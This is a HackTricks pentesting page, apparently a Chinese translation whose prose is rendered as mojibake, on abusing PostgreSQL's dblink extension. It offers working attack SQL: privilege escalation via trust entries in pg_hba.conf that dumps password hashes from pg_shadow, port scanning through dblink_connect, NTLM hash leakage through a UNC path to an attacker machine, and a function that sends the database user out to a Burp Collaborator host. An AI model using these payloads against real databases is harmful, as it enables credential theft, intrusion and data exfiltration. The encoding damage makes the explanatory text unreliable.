<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


**åœ¨åŸå§‹è®ºæ–‡ä¸­æŸ¥æ‰¾[å…³äºè¿™äº›æ”»å‡»çš„æ›´å¤šä¿¡æ¯](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**ã€‚

è‡ª**PostgreSQL 9.1**ä»¥æ¥ï¼Œå®‰è£…é™„åŠ æ¨¡å—å˜å¾—ç®€å•ã€‚[åƒ`dblink`è¿™æ ·çš„æ³¨å†Œæ‰©å±•](https://www.postgresql.org/docs/current/contrib.html)å¯ä»¥ä½¿ç”¨[`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)è¿›è¡Œå®‰è£…ï¼š
```sql
CREATE EXTENSION dblink;
```
ä¸€æ—¦åŠ è½½äº† dblinkï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œä¸€äº›æœ‰è¶£çš„æŠ€å·§ï¼š

## ç‰¹æƒæå‡

`pg_hba.conf` æ–‡ä»¶å¯èƒ½é…ç½®ä¸å½“ï¼Œ**å…è®¸**æ¥è‡ª**æœ¬åœ°ä¸»æœºçš„ä»»ä½•ç”¨æˆ·**è¿æ¥è€Œæ— éœ€çŸ¥é“å¯†ç ã€‚è¯¥æ–‡ä»¶é€šå¸¸å¯ä»¥åœ¨ `/etc/postgresql/12/main/pg_hba.conf` ä¸­æ‰¾åˆ°ï¼Œä¸è‰¯é…ç½®å¦‚ä¸‹ï¼š
```
local    all    all    trust
```
_è¯·æ³¨æ„ï¼Œæ­¤é…ç½®é€šå¸¸ç”¨äºåœ¨ç®¡ç†å‘˜å¿˜è®°å¯†ç æ—¶ä¿®æ”¹æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼Œå› æ­¤æœ‰æ—¶æ‚¨å¯èƒ½ä¼šæ‰¾åˆ°å®ƒã€‚_\
_è¿˜è¦æ³¨æ„ï¼Œpg\_hba.conf æ–‡ä»¶åªèƒ½è¢« postgres ç”¨æˆ·å’Œç»„è¯»å–ï¼Œåªèƒ½è¢« postgres ç”¨æˆ·å†™å…¥ã€‚_

å¦‚æœæ‚¨å·²ç»åœ¨å—å®³è€…å†…éƒ¨è·å¾—äº† shellï¼Œè¿™ç§æƒ…å†µéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå°†å…è®¸æ‚¨è¿æ¥åˆ° postgresql æ•°æ®åº“ã€‚

å¦ä¸€ç§å¯èƒ½çš„é”™è¯¯é…ç½®å¦‚ä¸‹ï¼š
```
host    all     all     127.0.0.1/32    trust
```
ç”±äºå®ƒå°†å…è®¸æ¥è‡ªæœ¬åœ°ä¸»æœºçš„æ‰€æœ‰äººä»¥ä»»ä½•ç”¨æˆ·èº«ä»½è¿æ¥åˆ°æ•°æ®åº“ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ**`dblink`**å‡½æ•°**æ­£å¸¸å·¥ä½œ**ï¼Œæ‚¨å¯ä»¥é€šè¿‡é€šè¿‡å·²å»ºç«‹çš„è¿æ¥è¿æ¥åˆ°æ•°æ®åº“ï¼Œå¹¶è®¿é—®æœ¬ä¸åº”è®¿é—®çš„æ•°æ®æ¥**æå‡æƒé™**ï¼š
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## ç«¯å£æ‰«æ

åˆ©ç”¨ `dblink_connect`ï¼Œæ‚¨è¿˜å¯ä»¥**æœç´¢å¼€æ”¾ç«¯å£**ã€‚å¦‚æœè¯¥**å‡½æ•°ä¸èµ·ä½œç”¨ï¼Œæ‚¨åº”è¯¥å°è¯•ä½¿ç”¨ `dblink_connect_u()`ï¼Œå› ä¸ºæ–‡æ¡£ä¸­æŒ‡å‡º `dblink_connect_u()` ä¸ `dblink_connect()` ç›¸åŒï¼Œåªæ˜¯å®ƒå…è®¸éè¶…çº§ç”¨æˆ·ä½¿ç”¨ä»»ä½•èº«ä»½éªŒè¯æ–¹æ³•è¿æ¥ã€‚
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
è¯·æ³¨æ„ï¼Œåœ¨èƒ½å¤Ÿä½¿ç”¨ `dblink_connect` æˆ– `dblink_connect_u` ä¹‹å‰ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‰§è¡Œï¼š
```
CREATE extension dblink;
```
## UNCè·¯å¾„ - NTLMå“ˆå¸Œæ³„éœ²
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
